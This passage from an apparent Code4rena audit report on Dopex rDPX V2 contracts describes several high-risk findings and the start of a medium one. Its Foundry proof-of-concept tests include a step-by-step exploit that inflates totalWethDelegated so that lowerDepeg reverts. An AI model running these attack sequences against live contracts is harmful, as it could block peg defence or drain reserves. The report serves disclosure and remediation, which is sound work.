Add this test to `Unit` contract inside `/tests/rdpxV2-core/Unit.t.sol`, also add `import "forge-std/console.sol";` and `import {OptionPricingSimple} from "contracts/libraries/OptionPricingSimple.sol";` in the contract  :

```solidity
    function testOptionPricingRevert() public {
        OptionPricingSimple optionPricingSimple;
        optionPricingSimple = new OptionPricingSimple(100, 5e6);

        (uint256 rdpxRequired, uint256 wethRequired) = rdpxV2Core
            .calculateBondCost(1 * 1e18, 0);

        uint256 currentPrice = vault.getUnderlyingPrice(); // price of underlying wrt collateralToken
        uint256 strike = vault.roundUp(currentPrice - (currentPrice / 4)); // 25% below the current price
        // around 14 minutes before next funding payment
        vm.warp(block.timestamp + 7 days - 863 seconds);
        uint256 timeToExpiry = vault.nextFundingPaymentTimestamp() -
            block.timestamp;
        console.log("What is the current price");
        console.log(currentPrice);
        console.log("What is the strike");
        console.log(strike);
        console.log("What is time to expiry");
        console.log(timeToExpiry);
        uint256 price = vault.getUnderlyingPrice();
        // will revert
        vm.expectRevert();
        optionPricingSimple.getOptionPrice(strike, price, 100, timeToExpiry);
    }
```
### Recommended Mitigation Steps

Set minimum `timeToExpiry` inside `calculatePremium` :

```diff
  function calculatePremium(
    uint256 _strike,
    uint256 _amount,
    uint256 timeToExpiry,
    uint256 _price
  ) public view returns (uint256 premium) {
    premium = ((IOptionPricing(addresses.optionPricing).getOptionPrice(
      _strike,
      _price > 0 ? _price : getUnderlyingPrice(),
      getVolatility(_strike),
-      timeToExpiry
+      timeToExpiry < 864 ? 864 : timeToExpiry
    ) * _amount) / 1e8);
  }
```

**[psytama (Dopex) confirmed and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/756#issuecomment-1733776614):**
 > Modify time to expiry with a check for less than 864 seconds and make it more robust.

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/756#issuecomment-1773703004):**
 > The DOS is not conditional on an external requirement because it consistently happens, I'll ask judges, but am maintaining High Severity at this time.

***

## [[H-07] Incorrect precision assumed from RdpxPriceOracle creates multiple issues related to value inflation/deflation](https://github.com/code-423n4/2023-08-dopex-findings/issues/549)
*Submitted by [LokiThe5th](https://github.com/code-423n4/2023-08-dopex-findings/issues/549), also found by [minhtrng](https://github.com/code-423n4/2023-08-dopex-findings/issues/2206), [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/2131), Udsen ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/2076), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/1619)), 0xvj ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1976), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/1846)), [josephdara](https://github.com/code-423n4/2023-08-dopex-findings/issues/1911), [kutugu](https://github.com/code-423n4/2023-08-dopex-findings/issues/1855), [Evo](https://github.com/code-423n4/2023-08-dopex-findings/issues/1684), [0xTiwa](https://github.com/code-423n4/2023-08-dopex-findings/issues/1497), [crunch](https://github.com/code-423n4/2023-08-dopex-findings/issues/1363), [circlelooper](https://github.com/code-423n4/2023-08-dopex-findings/issues/1332), [0xPsuedoPandit](https://github.com/code-423n4/2023-08-dopex-findings/issues/1245), [Jiamin](https://github.com/code-423n4/2023-08-dopex-findings/issues/1115), gjaldon ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1075), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/1008), [3](https://github.com/code-423n4/2023-08-dopex-findings/issues/748), [4](https://github.com/code-423n4/2023-08-dopex-findings/issues/397)), [Juntao](https://github.com/code-423n4/2023-08-dopex-findings/issues/1058), [umarkhatab\_465](https://github.com/code-423n4/2023-08-dopex-findings/issues/998), hals ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/956), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/955)), [eeshenggoh](https://github.com/code-423n4/2023-08-dopex-findings/issues/877), [0xnev](https://github.com/code-423n4/2023-08-dopex-findings/issues/624), [T1MOH](https://github.com/code-423n4/2023-08-dopex-findings/issues/525), and [niki](https://github.com/code-423n4/2023-08-dopex-findings/issues/411)*

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L372> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L381> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L539> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1160>

The `RdpxEthPriceOracle`, available in the audit repo [here](https://github.com/dopex-io/rdpx-eth-oracle/blob/5762c2339b1c45b87ff4db172e43cef4a0ff603a/src/RdpxEthOracle.sol), provides the `RdpxV2Core`, the `UniV2LiquidityAmo` and the `PerpetualAtlanticVault` contracts the necessary values for `rdpx` related price calculations.

The issue is that these contracts expect the returned values to be in `1e8` precision (as stated in the natspec [here](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1224), [here](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L378) and [here](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/IPerpetualAtlanticVault.sol#L20C1-L24C65)). But the returned precision [is actually `1e18`](https://github.com/dopex-io/rdpx-eth-oracle/blob/5762c2339b1c45b87ff4db172e43cef4a0ff603a/src/RdpxEthOracle.sol#L243).

This difference creates multiple issues throughout the below contracts:

| Contract                     | Function               | Effect                                                       |
| ---------------------------- | ---------------------- | ------------------------------------------------------------ |
| `rdpxV2Core.sol`             | `getRdpxPrice()`       | Returns an `1e18` value when `1e8` expected                  |
|                              | `calculateBondCost()`  | Deflates the `rdpxRequired`                                  |
|                              | `calculateAmounts()`   | Inflates the `rdpxRequiredInWeth`                            |
|                              | `_transfer()`          | Inflates `rdpxAmountInWeth` and may cause possible underflow |
| `UniV2LiquidityAmo`          | `getLpPriceInEth()`    | Overestimates the lp value                                   |
| `ReLp.sol`                   | `reLP()`               | Inflates min token amounts                                   |
| `PerpetualAtlanticVault.sol` | `getUnderlyingPrice()` | Returns `1e18` instead of `1e8`                              |
|                              | `calculatePremium()`   | Inflates the premium calculation                             |

### Proof of Concept

The `RdpxEthPriceOracle.sol` file can be found [here](https://github.com/dopex-io/rdpx-eth-oracle/blob/5762c2339b1c45b87ff4db172e43cef4a0ff603a/src/RdpxEthOracle.sol)

It exposes the following functions used in the audit:

*   [`getLpPriceInEth()`](https://github.com/dopex-io/rdpx-eth-oracle/blob/5762c2339b1c45b87ff4db172e43cef4a0ff603a/src/RdpxEthOracle.sol#L200)
*   [`getRdpxPriceInEth()`](https://github.com/dopex-io/rdpx-eth-oracle/blob/5762c2339b1c45b87ff4db172e43cef4a0ff603a/src/RdpxEthOracle.sol#L243)

These two functions provide the current price denominated in `ETH`, with a precision in `1e18`, as confirmed by their respective natspec comments:

```
    /// @dev Returns the price of LP in ETH in 1e18 decimals
    function getLpPriceInEth() external view override returns (uint) {
    ...

    /// @notice Returns the price of rDPX in ETH
    /// @return price price of rDPX in ETH in 1e18 decimals
    function getRdpxPriceInEth() external view override returns (uint price) {

```

But, in the contracts from the audit repo, the business logic (and even the natspec) assumes the returned precision will be `1e8`. See below:

In the `RdpxV2Core` contract the assumption that the price returned from the oracle is clearly noted in the [natspec](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1227C1-L1227C1) of the `getRdpxPrice()` function:

      /**
       * @notice Returns the price of rDPX against ETH
       * @dev    Price is in 1e8 Precision
       * @return rdpxPriceInEth rDPX price in ETH
       **/
      function getRdpxPrice() public view returns (uint256) {
        return
          IRdpxEthOracle(pricingOracleAddresses.rdpxPriceOracle)
            .getRdpxPriceInEth();
      }

In `UniV2LiquidityAmo` the assumption is noted [here](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L378):

      /**
       * @notice Returns the price of a rDPX/ETH Lp token against the alpha token
       * @dev    Price is in 1e8 Precision
       * @return uint256 LP price
       **/
      function getLpPrice() public view returns (uint256) {

And it has business logic implication here:

      function getLpTokenBalanceInWeth() external view returns (uint256) {
        return (lpTokenBalance * getLpPrice()) / 1e8;
      }

In `PerpetualAtlanticVault` it is noted [here](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/IPerpetualAtlanticVault.sol#L21):

      /**
       * @notice Returns the price of the underlying in ETH in 1e8 precision
       * @return uint256 the current underlying price
       **/
      function getUnderlyingPrice() external view returns (uint256);

And the business logic implications in this contract are primarily found in the `calculatePremium` function, where the premium is divided by `1e8`:

      function calculatePremium(
        uint256 _strike,
        uint256 _amount,
        uint256 timeToExpiry,
        uint256 _price
      ) public view returns (uint256 premium) {
        premium = ((IOptionPricing(addresses.optionPricing).getOptionPrice(
          _strike,
          _price > 0 ? _price : getUnderlyingPrice(),
          getVolatility(_strike),
          timeToExpiry
        ) * _amount) / 1e8);
      }

From the audit files it's clear that the assumption was that the returned price would be in `1e8`, but this is Dopex's own `RdpxPriceOracle`, so was likely a simple oversight which slipped through testing as a `MockRdpxEthPriceOracle` was implemented to simplify testing, which mocked the values from the oracle, but only to a `1e8` precision.

### Recommended Mitigation Steps

For price feeds where `WETH` will be token B, it is convention (although not a standard, as far as the reviewer is aware), that the precision returned will be `1e18`. See [here](https://ethereum.stackexchange.com/questions/92508/do-all-chainlink-feeds-return-prices-with-8-decimals-of-precision).

As the sponsor indicated that the team might move to Chainlink oracles, it is suggested to modify the `RdpxV2Core`, `PerpetualAtlanticVault`, `UniV2Liquidity` and the `ReLp` contracts to work with the returned `1e18` precision, assuming that the keep the token pair as rdpx/WETH.

**[psytama (Dopex) confirmed and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/549#issuecomment-1733729931):**
 > The issue is in the oracle contract which returns 1e18.

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/549#issuecomment-1759261378):**
 > Seems like the Warden grouped a bunch of consequences down to the root cause of the oracle precision.
> 
> I'll need to determine how to group / ungroup findings as there seem to be multple impacts but a single root cause.

***

## [[H-08] The peg stability module can be compromised by forcing lowerDepeg to revert](https://github.com/code-423n4/2023-08-dopex-findings/issues/239)
*Submitted by [0xrafaelnicolau](https://github.com/code-423n4/2023-08-dopex-findings/issues/239), also found by [HHK](https://github.com/code-423n4/2023-08-dopex-findings/issues/1899), [koo](https://github.com/code-423n4/2023-08-dopex-findings/issues/1433), [\_eperezok](https://github.com/code-423n4/2023-08-dopex-findings/issues/1415), [ubermensch](https://github.com/code-423n4/2023-08-dopex-findings/issues/1292), [nobody2018](https://github.com/code-423n4/2023-08-dopex-findings/issues/1051), [bart1e](https://github.com/code-423n4/2023-08-dopex-findings/issues/978), [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/743), [0xnev](https://github.com/code-423n4/2023-08-dopex-findings/issues/623), [ElCid](https://github.com/code-423n4/2023-08-dopex-findings/issues/475), [HChang26](https://github.com/code-423n4/2023-08-dopex-findings/issues/292), [Vagner](https://github.com/code-423n4/2023-08-dopex-findings/issues/273), [max10afternoon](https://github.com/code-423n4/2023-08-dopex-findings/issues/205), [volodya](https://github.com/code-423n4/2023-08-dopex-findings/issues/176), [yashar](https://github.com/code-423n4/2023-08-dopex-findings/issues/155), [degensec](https://github.com/code-423n4/2023-08-dopex-findings/issues/116), [Krace](https://github.com/code-423n4/2023-08-dopex-findings/issues/82), [minhtrng](https://github.com/code-423n4/2023-08-dopex-findings/issues/2208), [KrisApostolov](https://github.com/code-423n4/2023-08-dopex-findings/issues/2186), [dimulski](https://github.com/code-423n4/2023-08-dopex-findings/issues/2180), [0xc0ffEE](https://github.com/code-423n4/2023-08-dopex-findings/issues/2146), [pontifex](https://github.com/code-423n4/2023-08-dopex-findings/issues/2135), [Toshii](https://github.com/code-423n4/2023-08-dopex-findings/issues/2092), [0xkazim](https://github.com/code-423n4/2023-08-dopex-findings/issues/1972), [dethera](https://github.com/code-423n4/2023-08-dopex-findings/issues/1954), [0xMosh](https://github.com/code-423n4/2023-08-dopex-findings/issues/1940), [halden](https://github.com/code-423n4/2023-08-dopex-findings/issues/1938), [mussucal](https://github.com/code-423n4/2023-08-dopex-findings/issues/1917), [ether\_sky](https://github.com/code-423n4/2023-08-dopex-findings/issues/1890), [wintermute](https://github.com/code-423n4/2023-08-dopex-findings/issues/1813), [bin2chen](https://github.com/code-423n4/2023-08-dopex-findings/issues/1788), [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1609), [0xvj](https://github.com/code-423n4/2023-08-dopex-findings/issues/1557), [Aymen0909](https://github.com/code-423n4/2023-08-dopex-findings/issues/1546), [glcanvas](https://github.com/code-423n4/2023-08-dopex-findings/issues/1483), [RED-LOTUS-REACH](https://github.com/code-423n4/2023-08-dopex-findings/issues/1457), [gizzy](https://github.com/code-423n4/2023-08-dopex-findings/issues/1436), [MiniGlome](https://github.com/code-423n4/2023-08-dopex-findings/issues/1408), [Talfao](https://github.com/code-423n4/2023-08-dopex-findings/issues/1391), [carrotsmuggler](https://github.com/code-423n4/2023-08-dopex-findings/issues/1022), [ladboy233](https://github.com/code-423n4/2023-08-dopex-findings/issues/977), [Baki](https://github.com/code-423n4/2023-08-dopex-findings/issues/962), [hals](https://github.com/code-423n4/2023-08-dopex-findings/issues/954), [chainsnake](https://github.com/code-423n4/2023-08-dopex-findings/issues/715), [asui](https://github.com/code-423n4/2023-08-dopex-findings/issues/714), [Viktor\_Cortess](https://github.com/code-423n4/2023-08-dopex-findings/issues/707), [Inspex](https://github.com/code-423n4/2023-08-dopex-findings/issues/661), [qbs](https://github.com/code-423n4/2023-08-dopex-findings/issues/653), [lanrebayode77](https://github.com/code-423n4/2023-08-dopex-findings/issues/613), [zaevlad](https://github.com/code-423n4/2023-08-dopex-findings/issues/547), [tapir](https://github.com/code-423n4/2023-08-dopex-findings/issues/535), [ABAIKUNANBAEV](https://github.com/code-423n4/2023-08-dopex-findings/issues/515), [dirk\_y](https://github.com/code-423n4/2023-08-dopex-findings/issues/361), [gumgumzum](https://github.com/code-423n4/2023-08-dopex-findings/issues/345), [zzebra83](https://github.com/code-423n4/2023-08-dopex-findings/issues/315), ravikiranweb3 ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/252), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/214)), [rvierdiiev](https://github.com/code-423n4/2023-08-dopex-findings/issues/235), [Nyx](https://github.com/code-423n4/2023-08-dopex-findings/issues/192), [kodyvim](https://github.com/code-423n4/2023-08-dopex-findings/issues/172), [Jorgect](https://github.com/code-423n4/2023-08-dopex-findings/issues/162), [Kow](https://github.com/code-423n4/2023-08-dopex-findings/issues/115), [deadrxsezzz](https://github.com/code-423n4/2023-08-dopex-findings/issues/88), [0xWaitress](https://github.com/code-423n4/2023-08-dopex-findings/issues/78), [0x111](https://github.com/code-423n4/2023-08-dopex-findings/issues/944), [atrixs6](https://github.com/code-423n4/2023-08-dopex-findings/issues/874), [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/796), [LFGSecurity](https://github.com/code-423n4/2023-08-dopex-findings/issues/581), [0xCiphky](https://github.com/code-423n4/2023-08-dopex-findings/issues/372), [grearlake](https://github.com/code-423n4/2023-08-dopex-findings/issues/368), [Yanchuan](https://github.com/code-423n4/2023-08-dopex-findings/issues/277), and [chaduke](https://github.com/code-423n4/2023-08-dopex-findings/issues/59)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L964> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L975-L990> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1002> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1110>

In a scenario where extreme market conditions necessitate the execution of the `lowerDepeg` function to restore the dpxETH/ETH peg, an attacker can exploit the flawed interaction between the `addToDelegate`, `withdraw`, and `sync` functions to force a revert on the admin's attempt to restore the peg. As a result, the protocol will not be able to effectively defend the peg, leading to potential disruptions in the protocol's peg stability module.

### Proof of Concept

If 1 dpxETH < 1 ETH, the `rpdxV2Core` contract admin will call the `lowerDepeg` function to restore the peg. The backing reserves are used to buy and burn dpxETH from the curve pool to bring back the peg to 1 ETH. An attacker can execute a transaction to manipulate the WETH reserves and cause the admin transaction to revert.

1.  The attacker initiates the exploit by calling the `addToDelegate` function, and depositing WETH into `rpdxV2Core` contract. By doing so, the attacker effectively updates the `totalWethDelegated` state variable, increasing it by the deposited amount.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L964>

2.  The attacker subsequently calls the `withdraw` function, which does not update the `totalWethDelegated` state variable. Consequently, the `totalWethDelegated` variable retains the inflated value of WETH delegated, even though the WETH has neither been delegated nor it remains available, since it was withdrawn.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L975-L990>

3.  Finally, the attacker calls the `sync` function which inaccurately updates the WETH reserves by subtracting the inflated `totalWethDelegated` value. This manipulation artificially reduces the WETH reserves in the contract to a really small value or even zero.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1002>

4.  The `rpdxV2Core` admin calls the `lowerDepeg` function to restore the dpxETH/ETH peg, which ultimately will revert due to an underflow error.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1110>

Note that the attacker can loop through the process outlined in steps 1. and 2., thereby increasing the `totalWethDelegated` through a small input amount, before executing the sync function. As a result, this attack becomes financially inexpensive to execute.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Setup} from "./Setup.t.sol";
import "../../lib/forge-std/src/console.sol";
import "../../lib/forge-std/src/StdError.sol";

contract Exploit is Setup {
    function testExploitWETHReserves() external {
        // note: setup
        address user1 = address(0x1001);
        address user2 = address(0x1002);
        weth.mint(address(user1), 10 ether);
        weth.mint(address(user2), 10 ether);
        rdpx.mint(address(user1), 1000000 ether);
        // user1 bonds
        vm.startPrank(user1);
        rdpx.approve(address(rdpxV2Core), type(uint256).max);
        weth.approve(address(rdpxV2Core), type(uint256).max);
        rdpxV2Core.bond(10 ether, 0, address(this));
        vm.stopPrank();

        // note: weth reserves manipulation 
        // gets the reserve of WETH in the core contract
        vm.startPrank(user2);
        (,uint256 wethReserveBefore,) = rdpxV2Core.getReserveTokenInfo("WETH");
        console.log("WETH reserve before: ", wethReserveBefore);
        // approve rpdxV2Core to spend WETH
        weth.approve(address(rdpxV2Core), type(uint256).max);
        // delegate WETH, and assert it was delegated
        uint256 delegateId = rdpxV2Core.addToDelegate(wethReserveBefore, 1e8);
        assertTrue(rdpxV2Core.totalWethDelegated() == wethReserveBefore);
        // withdraw WETH, assert WETH was withdrawn but it still says WETH is delegated
        rdpxV2Core.withdraw(delegateId);
        assertTrue(rdpxV2Core.totalWethDelegated() == wethReserveBefore);
        // assert that the user2 has the same balance he had before
        assertTrue(weth.balanceOf(user2) == 10 ether);
        // call sync and make WETH reserves -= WETH delegated
        rdpxV2Core.sync();
        // check the amount of WETH in reserves after and assert it is smaller than before
        (,uint256 wethReserveAfter,) = rdpxV2Core.getReserveTokenInfo("WETH");
        assertTrue(wethReserveBefore - rdpxV2Core.totalWethDelegated() == wethReserveAfter);
        console.log("WETH reserve after:  ", wethReserveAfter);
        vm.stopPrank();

        // note: admin tries to defend the peg.
        // update the dpxETH price to simulate 1 dpxETH < 1 ETH
        dpxEthPriceOracle.updateDpxEthPrice(98137847);
        // expect the transaction to revert with an underflow.
        vm.expectRevert(stdError.arithmeticError);
        rdpxV2Core.lowerDepeg(0, 10 ether, 0, 0);
}
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Update the totalWethDelegated in the `withdraw` function.

```solidity
    function withdraw(uint256 delegateId) external returns (uint256 amountWithdrawn) {
        _whenNotPaused();
        _validate(delegateId < delegates.length, 14);
        Delegate storage delegate = delegates[delegateId];
        _validate(delegate.owner == msg.sender, 9);

        amountWithdrawn = delegate.amount - delegate.activeCollateral;
        _validate(amountWithdrawn > 0, 15);
        delegate.amount = delegate.activeCollateral;
+       totalWethDelegated -= amountWithdrawn;

        IERC20WithBurn(weth).safeTransfer(msg.sender, amountWithdrawn);

        emit LogDelegateWithdraw(delegateId, amountWithdrawn);
    }
```

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/239#issuecomment-1773166739):**
 > Best + explains why it's high.

**[psytama (Dopex) confirmed via duplicate issue 2186](https://github.com/code-423n4/2023-08-dopex-findings/issues/2186)**

***

## [[H-09] `ReLPContract` wrongfully assumes protocol owns all of the liquidity in the UniswapV2 pool](https://github.com/code-423n4/2023-08-dopex-findings/issues/143)
*Submitted by [deadrxsezzz](https://github.com/code-423n4/2023-08-dopex-findings/issues/143), also found by [kutugu](https://github.com/code-423n4/2023-08-dopex-findings/issues/1518), [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/905), [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1812), [0xMango](https://github.com/code-423n4/2023-08-dopex-findings/issues/1531), [pep7siup](https://github.com/code-423n4/2023-08-dopex-findings/issues/1172), and [0xDING99YA](https://github.com/code-423n4/2023-08-dopex-findings/issues/830)*

Possible full DoS for `ReLPContract`

### Proof of Concept

When taking out a `bond` in `RdpxV2Core` if `isReLPActive == true`, a call to `ReLPContract#reLP` is made which 're-LPs the pool\` (takes out an amount of RDPX, while still perfectly maintaining the token ratio of the pool).

```solidity
    (uint256 reserveA, uint256 reserveB) = UniswapV2Library.getReserves(  // @audit - here it gets the reserves of the pool and assumes them as owned by the protocol
      addresses.ammFactory,
      tokenASorted,
      tokenBSorted
    );

    TokenAInfo memory tokenAInfo = TokenAInfo(0, 0, 0);

    // get tokenA reserves
    tokenAInfo.tokenAReserve = IRdpxReserve(addresses.tokenAReserve)
      .rdpxReserve(); // rdpx reserves

    // get rdpx price
    tokenAInfo.tokenAPrice = IRdpxEthOracle(addresses.rdpxOracle)
      .getRdpxPriceInEth();

    tokenAInfo.tokenALpReserve = addresses.tokenA == tokenASorted
      ? reserveA
      : reserveB;

    uint256 baseReLpRatio = (reLPFactor *
      Math.sqrt(tokenAInfo.tokenAReserve) *
      1e2) / (Math.sqrt(1e18)); // 1e6 precision

    uint256 tokenAToRemove = ((((_amount * 4) * 1e18) /
      tokenAInfo.tokenAReserve) *
      tokenAInfo.tokenALpReserve *   // @audit - here the total RDPX reserve in the pool is assumed to be owned by the protocol
      baseReLpRatio) / (1e18 * DEFAULT_PRECISION * 1e2);

    uint256 totalLpSupply = IUniswapV2Pair(addresses.pair).totalSupply();

    uint256 lpToRemove = (tokenAToRemove * totalLpSupply) /
      tokenAInfo.tokenALpReserve;
```

The problem is that the protocol wrongfully assumes that it owns all of the liquidity within the pool. This leads to faulty calculations. In best case scenario wrong amounts are passed. However, when the protocol doesn't own the majority of the pool LP balance, this could lead to full DoS, as `lpToRemove` will be calculated to be more than the LP balance of `UniV2LiquidityAmo` and the transaction will revert.

This can all be easily proven by a simple PoC (add the test to the given `Periphery.t.sol`)
Note: there's an added `console.log` in `ReLPContract#reLP`, just before the `transferFrom` in order to better showcase the issue

```solidity
    uint256 lpToRemove = (tokenAToRemove * totalLpSupply) /
      tokenAInfo.tokenALpReserve;

    console.log("lpToRemove value:    ", lpToRemove);  // @audit - added console.log to prove the underflow
    // transfer LP tokens from the AMO
    IERC20WithBurn(addresses.pair).transferFrom(
      addresses.amo,
      address(this),
      lpToRemove
    );
```

```solidity
  function testReLpContract() public {
    testV2Amo();

    // set address in reLP contract and grant role
    reLpContract.setAddresses(
      address(rdpx),
      address(weth),
      address(pair),
      address(rdpxV2Core),
      address(rdpxReserveContract),
      address(uniV2LiquidityAMO),
      address(rdpxPriceOracle),
      address(factory),
      address(router)
    );
    reLpContract.grantRole(reLpContract.RDPXV2CORE_ROLE(), address(rdpxV2Core));

    reLpContract.setreLpFactor(9e4);

    // add liquidity
    uniV2LiquidityAMO.addLiquidity(5e18, 1e18, 0, 0);
    uniV2LiquidityAMO.approveContractToSpend(
      address(pair),
      address(reLpContract),
      type(uint256).max
    );

    rdpxV2Core.setIsreLP(true);


    (uint256 reserveA, uint256 reserveB, ) = pair.getReserves();
    weth.mint(address(2), reserveB * 10);
    rdpx.mint(address(2), reserveA * 10);
    vm.startPrank(address(2));
    weth.approve(address(router), reserveB * 10);
    rdpx.approve(address(router), reserveA * 10);
    router.addLiquidity(address(rdpx), address(weth), reserveA * 10, reserveB * 10, 0, 0, address(2), 12731316317831123);
    vm.stopPrank();
    
    console.log("UniV2Amo balance isn't enough and will underflow");
    uint pairBalance = pair.balanceOf(address(uniV2LiquidityAMO));
    console.log("UniV2Amo LP balance: ", pairBalance);

    vm.expectRevert("ds-math-sub-underflow");
    rdpxV2Core.bond(1 * 1e18, 0, address(this));
}
```

And the logs:

    [PASS] testReLpContract() (gas: 3946961)
    Logs:
      UniV2Amo balance isn't enough and will underflow
      UniV2Amo LP balance:  2235173550604750304
      lpToRemove value:     17832559500122488916

### Recommended Mitigation Steps

Change the logic and base all calculations on the pair balance of `UniV2LiquidityAmo`

**[psytama (Dopex) confirmed and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/143#issuecomment-1733719078):**
 > The re-LP formula used is incorrect.

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/143#issuecomment-1755815613):**
 > The incorrect assumption does indeed cause reverts.

***
# Medium Risk Findings (17)
## [[M-01] Bonding WETH discounts can drain WETH reserves of RdpxV2Core contract to zero](https://github.com/code-423n4/2023-08-dopex-findings/issues/2210)
*Submitted by [Toshii](https://github.com/code-423n4/2023-08-dopex-findings/issues/2210)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L570> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1175-L1177>

Depending on the reserves of rDPX, bonding discounts are given both on the rDPX and WETH collateral requirements for minting dpxETH. The bonding discounts (for both rDPX and WETH portions) are provided as rDPX which is taken from the treasury. The issue with this is that the RdpxV2Core contract only functions properly when the full amount of WETH is provided (75% of the dpxETH value), because as per docs, 50% of the value of the dpxETH you are minting is required in WETH to add liquidity to the dpxETH-WETH pool.

This discount in WETH collateral requirements can be as high as `2/3 * 75% = 50%` of the entire value of dpxETH. The logic in the RdpxV2Core essentially then steals this extra WETH from the current balance of the contract, which can eventually drain this entire contract of WETH, leaving only rDPX tokens, which is highly problematic in terms of economic security. This will also DOS all future attempts to mint dpxETH once the WETH reserves are depleted.

### Proof of Concept

When a user bonds using rDPX directly they first call the `bond` function of the RdpxV2Core contract:

```solidity
function bond(
  uint256 _amount,
  uint256 rdpxBondId,
  address _to
) public returns (uint256 receiptTokenAmount) {
  _whenNotPaused();
  // Validate amount
  _validate(_amount > 0, 4);

  // Compute the bond cost
  (uint256 rdpxRequired, uint256 wethRequired) = calculateBondCost(
    _amount,
    rdpxBondId
  );
  ...
  // purchase options
  uint256 premium;
  if (putOptionsRequired) {
    premium = _purchaseOptions(rdpxRequired);
  }

  _transfer(rdpxRequired, wethRequired - premium, _amount, rdpxBondId);
  
  // Stake the ETH in the ReceiptToken contract
  receiptTokenAmount = _stake(_to, _amount);
  ...
}
```

The amount of WETH required, `wethRequired`, is calculated by the `calculateBondCost` function with the main logic being the following (note: the cost of the premium for the purchased amount of rDPX PUT option coverage is also included in this amount, but i am not showing that code here):

```solidity
wethRequired =
  ((ETH_RATIO_PERCENTAGE - (bondDiscount / 2)) * _amount) /
  (DEFAULT_PRECISION * 1e2);
```

As can be seen, there is a potential `bondDiscount`, which can be at most 100e8. Given that ETH_RATIO_PERCENTAGE is set to 75e8, the minimum amount of `wethRequired` would be 25% of the `_amount` of dpxETH being minted. The remainder, which in this case would be 50% of the value of the dpxETH, will be provided by the reserve. Note: if this math didn't make sense, recall that 75% of the value of the minted dpxETH needs to be provided in ETH, and this discount can be as much as 2/3 of the ETH amount, meaning the minimum ETH requirement of the user will be 75% &ast; 2/3 = 25%.

The remainder of the ETH portion (`discountReceivedInWeth`) is then paid for by the reserve in the `_transfer` function, which is defined as follows:

```solidity
function _transfer(
  uint256 _rdpxAmount,
  uint256 _wethAmount,
  uint256 _bondAmount,
  uint256 _bondId
) internal {
  if (_bondId != 0) {
    ...
  } else {
    ...
    // calculate extra rdpx to withdraw to compensate for discount
    uint256 rdpxAmountInWeth = (_rdpxAmount * getRdpxPrice()) / 1e8;
    uint256 discountReceivedInWeth = _bondAmount -
      _wethAmount -
      rdpxAmountInWeth;
    uint256 extraRdpxToWithdraw = (discountReceivedInWeth * 1e8) /
      getRdpxPrice();

    // withdraw the rdpx
    IRdpxReserve(addresses.rdpxReserve).withdraw(
      _rdpxAmount + extraRdpxToWithdraw
    );

    reserveAsset[reservesIndex["RDPX"]].tokenBalance +=
      _rdpxAmount +
      extraRdpxToWithdraw;
  }
}
